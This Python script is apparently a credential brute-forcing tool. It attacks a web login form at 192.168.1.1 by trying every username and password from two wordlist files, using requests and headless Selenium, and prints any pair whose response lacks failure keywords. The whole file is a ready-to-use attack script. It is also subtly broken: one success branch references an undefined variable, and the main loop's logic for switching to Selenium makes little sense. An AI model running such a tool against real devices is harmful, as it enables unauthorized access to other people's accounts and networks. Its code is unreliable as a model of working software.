import requests
import sys
from requests_html import HTMLSession
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

URL = "http://192.168.1.1"
EXPRESSIONS = {b"failed", b"error", b"incorrect", b"failure", b"try", b"again", b"invalid", b"upgrade", b"outdated", b"browser"}

def brute_with_selenium(username, password):
    options = Options()
    options.headless = True
    driver = webdriver.Firefox(options=options)

    try:
        driver.get(URL)
        username_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.NAME, "username"))
        )
        password_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.NAME, "password"))
        )
        username_input.send_keys(username)
        password_input.send_keys(password)
        password_input.submit()

        driver_lower_content = driver.page_source.lower().encode('utf-8')

        if not any(item in driver_lower_content for item in EXPRESSIONS):
            print("\nBrute Forcing...")
            print("[+] Username: ", username)
            print("[+] Password: ", password)
            print("Server Response:", driver.page_source.encode('utf-8'))
            sys.exit()
    finally:
        driver.quit()

def brute_with_requests(username, password):
    a = requests.post(URL, data={'username': username, 'password': password}, verify=False)
    r_content = a.content.lower()
    if not any(item in r_content for item in EXPRESSIONS):
        print("\nBrute Forcing...")
        print("[+] Username: ", username)
        print("[+] Password: ", password)
        print("Server Response:", r.content)
        sys.exit()

def brute(username, password):
    try:
        brute_with_requests(username, password)
    except requests.exceptions.SSLError as e:
        print("Erro de SSL:", e)
        sys.exit(1)

def main():
    combinations_tested = 0
    use_selenium = False

    usernames = [u.strip() for u in open("username.txt", "r").readlines()]
    passwords = [p.strip() for p in open("password.txt", "r").readlines()]

    try:
        for username in usernames:
            for password in passwords:
                combinations_tested += 1
                sys.stdout.write("\rCombinations tested: %d" % combinations_tested)
                sys.stdout.flush()

                if use_selenium or any(brute(username, password) for item in EXPRESSIONS):
                    use_selenium = True
                    brute_with_selenium(username, password)
    except KeyboardInterrupt:
        print("\n\033[91mExiting...\033[0m")

if __name__ == '__main__':
    requests.packages.urllib3.disable_warnings()
    main()
